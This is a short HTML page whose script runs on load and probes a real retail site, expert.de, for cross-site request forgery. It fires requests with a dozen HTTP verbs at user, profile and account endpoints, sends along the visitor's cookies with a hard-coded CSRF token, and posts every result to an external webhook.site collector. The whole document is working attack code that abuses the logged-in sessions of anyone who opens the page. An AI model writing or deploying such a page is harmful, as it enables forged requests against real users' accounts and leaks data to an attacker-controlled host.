<!DOCTYPE html>
<meta charset="utf-8">
<title>brut-HEAD</title>
<script>
  const HOOK='https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';
  function log(x){fetch(HOOK,{method:'POST',mode:'no-cors',body:x}).catch(()=>{})}

  const verbs=['GET','HEAD','POST','PUT','PATCH','DELETE','OPTIONS','TRACE','CONNECT','CUSTOM1','PING','DEBUG'];
  const paths=[
     'api/user/profile',
     'api/v1/user',
     'api/account',
     'api/me',
     'user',
     'profile',
     'account',
     'customer'
  ];

  const tk='1e206742-fb4a-44d2-8174-be9b2e2d6425';

  for(const vb of verbs){
    for(const pa of paths){
      fetch(`https://www.expert.de/${pa}`,{
         method:vb,
         credentials:'include',
         headers:{'csrf-token':tk},
         mode:'no-cors'
      })
      .then(r => log(`HEAD-${vb}-${pa}=${r.type},redir=${r.redirected}`))
      .catch(()=>log(`HEAD-${vb}-${pa}=fail`));
    }
  }
</script>
